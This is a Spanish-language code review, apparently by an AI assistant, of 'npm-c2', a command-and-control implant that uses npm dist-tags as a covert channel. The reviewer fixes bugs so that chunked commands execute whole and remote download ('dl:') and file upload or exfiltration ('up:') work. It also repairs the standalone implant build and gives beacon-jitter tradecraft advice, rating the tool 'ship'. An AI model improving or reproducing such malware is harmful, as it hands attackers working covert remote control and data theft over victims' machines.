# Revisión de código — npm-c2

Revisión hecha sobre `9c082ab` (npm-c2 v1.0.0, Apache-2.0, repo público), con
ejecución real contra un registro npm simulado (`tests/mock_registry.py`).
Ningún hallazgo sale de leer el código a ojo: cada uno tiene un test que lo
reproduce.

## Veredicto

`no_ship` sobre el estado original. El protocolo de tags troceadas no
funcionaba: un comando de más de una etiqueta se ejecutaba **en pedazos** y la
salida se imprimía como fragmentos base64 sueltos. Todo lo demás es menor al
lado de eso.

Tras los cambios: 13/13 checks de la suite de bugs, 8/8 pasos end-to-end, 6/6
pasos del implante standalone generado. `no_ship` → `ship` para el canal de
comandos, con las limitaciones de abajo.

## Hallazgos, por severidad

### P0 — Comandos largos se ejecutaban en trozos

`encode_payload` partía el comando en N tags, pero `Implant._parse` trataba
**cada tag como un comando independiente**. Un `echo` de 400 caracteres llegaba
al shell como 4 comandos distintos.

Evidencia (código original):
```
[FAIL] multi-tag command reassembled -> 3 tags produced 4 executable command(s)
```

Arreglo: marco de 4 campos con identificador de grupo, índice y total
(`<prefix><gid>-<idx><total>_<b64>`), y `group_chunks()` que solo entrega
payloads completos. Un grupo incompleto nunca se ejecuta; se espera al
siguiente poll. Los tags en formato v1 (`<nonce>_<b64>`) siguen decodificándose
como payload de un solo trozo.

### P0 — Resultados largos se perdían

El lado operador imprimía cada tag `arm64-*` por separado. 900 caracteres de
salida salían como 6 líneas de basura base64.

```
[FAIL] multi-tag result rendered as one value -> 6 result tags, decoded total 11 chars of 900
```

Arreglo: mismo `group_chunks()` en `poll_results()` y `watch()`; ahora se
imprime el payload completo y los grupos incompletos se anuncian como tales.

### P1 — `build.bat` compilaba un traceback

`build.bat` llamaba a `python src\npm_c2\__main__.py` (imports relativos →
falla) y además redirigía `2>&1` al mismo fichero que la salida:

```
python "%PROJ%src\npm_c2\__main__.py" --generate-standalone > "%TEMP%\%NAME%.py" 2>&1
```

El resultado es un `.py` con un traceback dentro que pyinstaller intentaría
compilar. Evidencia: el fichero generado empieza por `Traceback (most recent
call last):` y `--generate-standalone` sale con código 1.

Arreglo: `python -m npm_c2 --generate-standalone`, stderr fuera del fichero, y
un `ast.parse` de verificación antes de invocar pyinstaller. También acepta
`build.bat <token> <package>` para no tener que regenerar a mano.

### P1 — Paquetes con scope generaban una URL inválida

`API.format(package)` metía `@scope/pkg` en crudo; la ruta de dist-tags de npm
quiere `@scope%2fpkg`.

```
[FAIL] scoped package URL is encoded -> API.format('@scope/pkg') = '.../-/package/@scope/pkg/dist-tags'
```

Arreglo: `registry_path()` percent-codifica solo el separador del scope.

### P1 — `dl:` roto con cualquier URL con esquema

`dl:http://host:8080/x.exe:C:\temp\x.exe` se partía por el **primer** colon, así
que la URL quedaba en `http` y el error que veías era `unknown url type`.

```
[FAIL] dl: parses an http URL -> result="(unknown url type: 'http')"
```

Arreglo: `_split_dl()` elige el colon cuyo lado derecho parece una ruta
(`/ruta`, `\ruta`, `C:\ruta`), con casos cubiertos para URL con puerto, destino
con unidad Windows y nombre de fichero pelado.

### P1 — `up:` corrompía el fichero

```python
data = base64.b64encode(f.read())[:1000]
```

Corta el base64, no el fichero: el resultado no decodifica y encima se
desperdicia el 25% del presupuesto. Arreglo: se leen como mucho `MAX_UPLOAD`
bytes (3000), se codifican enteros y la cabecera marca `+` cuando hay recorte
(`up 3000b+: <b64>`).

### P1 — Errores HTTP del registro invisibles

`Operator._fetch` devolvía `{}` ante cualquier código distinto de 200, así que
un token revocado o un paquete inexistente se veían como "no results".

```
[FAIL] fetch surfaces HTTP errors -> _fetch returned {} for a 404 package
```

Arreglo: `RegistryError` con el motivo (404 / 401-403 / otro) y salida 2 en la
CLI.

### P2 — `poll_results` gastaba dos GET por poll

Iteraba `self._results()` y luego lo llamaba otra vez para decidir si imprimir
"no results".

```
[FAIL] poll_results uses one GET -> GETs spent: 2
```

### P2 — El tope de tags vistos expulsaba uno arbitrario

`self.seen` era un `set` y `self.seen.pop()` saca un elemento cualquiera. Con
más de 128 tags, un comando viejo podía volver a ejecutarse. Arreglo:
`OrderedDict` con `popitem(last=False)` y tope 512.

```
[FAIL] seen-set evicts oldest first -> oldest tag still resident after overflow
```

### P2 — `sleep:` aceptaba negativos y reventaba con basura

`sleep:-5` dejaba el intervalo en `max(10, -5)=10` por accidente, pero
`sleep:abc` lanzaba `ValueError` dentro del parseo. Ahora valida y responde con
error.

### P2 — Fichero de estado no atómico

`_save()` truncaba el `.idx` y escribía encima: un corte a media escritura
dejaba el estado corrupto y provocaba re-ejecución. Ahora `tmp` + `os.replace`.

### P2 — Errores silenciados en el bucle principal

`except Exception: pass` en `run()`. Un canal roto era indistinguible de un
canal vacío. Ahora, con `--verbose`, cada ciclo fallido se reporta.

## Discrepancia de documentación

El README afirma en OPSEC **"Polling pattern: gaussian jitter"**. El código usa
`random.uniform(0, jitter)` — uniforme, no gaussiana. No lo he cambiado porque
es una decisión de tradecraft, no un bug; queda anotado para que el README y el
código digan lo mismo. (Si se quiere gaussiana de verdad: `min(jitter,
abs(random.gauss(0, jitter / 3)))`.)

## Lo que no he tocado

- **Obfuscación de token = XOR con `SHA256(package)[:16]`.** El nombre del
  paquete está en el propio binario, así que la clave también. El README ya lo
  llama obfuscación y no cifrado; sigue siendo extraíble con `strings` + 20
  líneas de Python. No hay arreglo real sin una clave fuera de banda.
- **Sin reintentos ni backoff** en 429/5xx. Añadirlo cambia el perfil temporal
  del beacon, que es justo lo que un operador quiere controlar.
- **`MAX_TAG_LEN = 250` sin verificar contra el registro real.** No he podido
  probarlo contra npmjs.org sin publicar un paquete; el límite que sí está
  documentado (214) aplica a nombres de paquete, no a dist-tags. Queda como
  verificación pendiente: un PUT real con un tag de 250 caracteres.
- **Compatibilidad Python 3.8.** Todo parsea con `feature_version=(3,8)` y los
  cambios usan `from __future__ import annotations`, pero no hay un 3.8 real en
  esta máquina para ejecutarlo.

## Cómo reproducirlo

```sh
python3 -m venv .venv && .venv/bin/pip install -e .
.venv/bin/python -m npm_c2 --self-test
.venv/bin/python tests/test_bugs.py        # 13/13
.venv/bin/python tests/test_e2e.py         # 8/8 pasos
.venv/bin/python tests/test_standalone.py  # 6/6 pasos, incluye el implante generado
```

Los tres corren contra `tests/mock_registry.py` por HTTP real en `127.0.0.1`,
sin tocar npmjs.org ni necesitar credenciales.
